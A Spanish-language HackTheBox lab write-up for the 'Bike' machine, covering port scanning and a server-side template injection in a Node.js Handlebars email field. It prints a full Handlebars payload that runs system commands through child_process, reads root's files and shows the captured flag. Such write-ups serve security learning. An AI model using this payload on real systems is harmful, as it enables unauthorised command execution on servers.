# Bike

Plataforma: HackTheBox
OS: Linux
Level: Very Easy
Status: Done
Complete: Yes
Created time: 6 de enero de 2025 14:02
IP: 10.129.97.64

## Recopilación de información

<aside>
💡

</aside>

### **Escaneo de puertos**

Comenzamos con un escaneo para identificar que puertos están abiertos.

---

```bash
❯ sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 10.129.97.64 -oG allports
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

```

### **Enumeración de servicios**

Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.

---

```bash
❯ sudo nmap -p22,80 -sCV -vvv 10.129.97.64 -oN targeted

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
80/tcp open  http    syn-ack ttl 63 Node.js (Express middleware)
|_http-title:  Bike 
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

- **Identificación de vulnerabilidades**
    - *22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)*
    - 
    
    80/tcp open  http    syn-ack ttl 63 Node.js (Express middleware)
    

**Enumeración Web**

whatweb

```bash
whatweb 10.129.97.64

http://10.129.97.64 [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.129.97.64], JQuery[2.2.4], Script, Title[Bike], X-Powered-By[Express], X-UA-Compatible[ie=edge]

```

## Explotación

<aside>
💡 El seguimiento de HackThBox nos indica que hay un posible fallo relacionado con un Server Side Template Injection

</aside>

### Explotación 1

Test SSTI: Probamos con un test

![image.png](<imagenes/image 76.png>)

```bash
Payload: Campo email
 {{7*7}} 
```

![image.png](<imagenes/image 77.png>)

Vemos que da un error

Revisando Hacktricks encontramos un Payload para Handlebars en Node.js 

```bash
{{#with "s" as |string|}}
 {{#with "e"}}
 {{#with split as |conslist|}}
 {{this.pop}}
 {{this.push (lookup string.sub "constructor")}}
 {{this.pop}}
 {{#with string.split as |codelist|}}
 {{this.pop}}
 {{this.push "return require('child_process').exec('whoami');"}}
 {{this.pop}}
 {{#each conslist}}
 {{#with (string.sub.apply 0 codelist)}}
 {{this}}
 {{/with}}
 {{/each}}
 {{/with}}
 {{/with}}
 {{/with}}
{{/with}}
```

URLencodeamos con BurpSuite para poder pasarlo con el request

Obtenemos un error :

The response shows an error that states require is not defined . Taking a look at the payload we notice
the following code

```bash
{{this.push "return require('child_process').exec('whoami');"}}
```

Hay que modificar las variables ya que node.js usa variables globales :

```bash
__dirname
__filename
exports
module
require()
```

Usamos por lo tanto:

```bash
{{#with "s" as |string|}}
 {{#with "e"}}
 {{#with split as |conslist|}}
 {{this.pop}}
 {{this.push (lookup string.sub "constructor")}}
 {{this.pop}}
 {{#with string.split as |codelist|}}
 {{this.pop}}
 {{this.push "return
process.mainModule.require('child_process').execSync('whoami');"}}
 {{this.pop}}
 {{#each conslist}}
 {{#with (string.sub.apply 0 codelist)}}
 {{this}}
 {{/with}}
 {{/each}}
 {{/with}}
 {{/with}}
 {{/with}}
{{/with}}
```

Con la linia modificada :

```bash
{{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}
```

Ahora, con Burpsuite, URLEncodeamos el payload y lo enviamos en el campo “email”:

![image.png](<imagenes/image 78.png>)

![image.png](<imagenes/image 79.png>)

Vemos que se ejecuta el comando “whoami” que enviamos en el payload.

Ahora probamos con otros comandos:

```bash
# Listar contenido de root

{{this.push "return process.mainModule.require('child_process').execSync('ls
/root');"}}
```

![image.png](<imagenes/image 80.png>)

Por último, probamos a leer el contenido de la flag con:

```bash
{{this.push "return process.mainModule.require('child_process').execSync('cat
/root/flag.txt');"}}
```

![image.png](<imagenes/image 81.png>)

Flag:  6b258d726d287462d60c103d0142a81c

## Conclusión

<aside>
💡 Maquina establecida como muy fácil, pero que al no conocer Node.js ni como proceder a explotar un SSTI, me ha supuesto tener que mirar el Writeup

</aside>